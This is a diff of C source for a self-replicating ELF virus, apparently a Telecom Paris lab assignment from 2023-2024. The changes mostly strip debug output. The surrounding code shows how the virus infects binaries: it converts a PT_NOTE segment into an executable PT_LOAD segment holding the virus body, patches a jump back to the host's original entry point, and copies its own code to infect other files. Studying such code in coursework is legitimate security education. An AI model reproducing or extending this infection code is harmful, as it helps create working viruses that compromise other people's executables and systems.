@@ -278,7 +278,6 @@ void replaceJmpExit(char *virusCode, char *newCode, unsigned vlen, unsigned old_
 
         {
             // found jmp exit
-            write(1, STR("in replace loop\\n"), strlen("in replace loop\\n"));
             char entry_point_str[64];
             char *newInstruction = "jmp ";
             xtoa(old_entry_point, entry_point_str);
@@ -321,8 +320,6 @@ int infect_elf(const char *filename, void *virus_code, unsigned int virus_size)
         return 0;
     }
     write(1, STR("Found an ELF file\\n"), strlen("Found an ELF file\\n"));
-    // write_int(elf_header.e_entry, STR("\\n"), xtoa);
-    // write_int(elf_header.e_entry, STR("\\n"), utoa);
 
     // check if the class is 64 bits
     if (elf_header.e_ident[EI_CLASS] != ELFCLASS64)
@@ -350,12 +347,10 @@ int infect_elf(const char *filename, void *virus_code, unsigned int virus_size)
     Elf64_Phdr phHeaders[phnum];
     if (lseek(fd, phoff, SEEK_SET) == -1)
     {
-        write(1, STR("can't lseek to phoff\\n"), strlen("can't lseek to phoff\\n"));
         return 0;
     }
     if (read(fd, phHeaders, elf_header.e_phentsize * phnum) != elf_header.e_phentsize * phnum)
     {
-        write(1, STR("can't read pht\\n"), strlen("can't read pht\\n"));
         return 0;
     }
 
@@ -405,7 +400,6 @@ int infect_elf(const char *filename, void *virus_code, unsigned int virus_size)
     }
 
     // Modify the PT_NOTE segment entry
-    // first check if the file contains a PT_NOTE segment
     if (!first_PT_NOTE)
         return 0;
     write(1, STR("File contains PT_NOTE segment\\n"), strlen("File contains PT_NOTE segment\\n"));
@@ -413,7 +407,7 @@ int infect_elf(const char *filename, void *virus_code, unsigned int virus_size)
     note_phdr.p_type = PT_LOAD;
     note_phdr.p_align = 4096;
     note_phdr.p_flags = PF_R | PF_X;
-    note_phdr.p_filesz = virus_size + 64;
+    note_phdr.p_filesz = virus_size + 64;//The virus code has to be modified so we increase its size by a little
     note_phdr.p_memsz = virus_size + 64;
     note_phdr.p_offset = filesize;
     note_phdr.p_paddr = max_segment_end;
@@ -512,9 +506,6 @@ int virus(void)
     unsigned vlen = end - _start;
     char *start_address = (char *)virus_address();
     char virusCode[vlen];
-    // char s[64];
-    // write_int(start_address, STR("\\n"), xtoa);
-    // xtoa(start_address, s);
     memcpy(virusCode, start_address, vlen);
     int nb_infected = parcours(virusCode, vlen);
     write(1, STR("TP Virus: Telecom Paris - 2023-2024\\n"), 36);
